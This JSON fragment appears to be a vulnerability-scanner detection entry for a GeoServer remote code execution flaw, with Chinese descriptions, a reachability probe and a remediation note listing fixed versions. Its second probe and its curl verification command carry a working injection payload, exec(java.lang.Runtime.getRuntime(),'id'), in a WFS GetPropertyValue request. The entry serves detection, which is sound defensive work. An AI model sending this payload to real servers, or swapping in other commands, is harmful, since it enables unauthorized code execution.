  "detection_method": "发送GET请求到 /geoserver/wfs?service=WFS&request=GetCapabilities 获取图层名，然后发送包含exec(java.lang.Runtime.getRuntime(),'id')的GetPropertyValue请求，若响应XML中包含命令执行结果（如uid=...）则漏洞存在",
  "probes": [
    {
      "id": "geoserver_capabilities_probe",
      "description": "确认 GeoServer 服务可达",
      "method": "GET",
      "path": "/geoserver/ows?service=wms&version=1.3.0&request=GetCapabilities",
      "timeout": 10,
      "success_signs": {
        "status_codes": [
          200
        ],
        "body_contains_any": [
          "GeoServer",
          "WMS_Capabilities",
          "wms:"
        ]
      },
      "confidence": 0.6
    },
    {
      "id": "geoserver_eval_probe",
      "description": "exec 注入 id，观察响应是否含命令结果或 ClassCastException",
      "method": "GET",
      "path": "/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')",
      "timeout": 10,
      "success_signs": {
        "body_contains_any": [
          "uid=",
          "ClassCastException",
          "java.lang.Runtime",
          "Process"
        ]
      },
      "confidence": 0.9
    }
  ],
  "verification_command": "curl \"http://{TARGET}/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')\"",
  "verification_success_sign": "响应XML中包含命令执行结果（如uid=...）或出现java.lang.ClassCastException错误",
  "requires_callback": false,
  "callback_note": "无需回连，直接通过exec表达式执行系统命令",
  "remediation": "升级到GeoServer 2.25.2, 2.24.4, 2.23.6或更高版本",
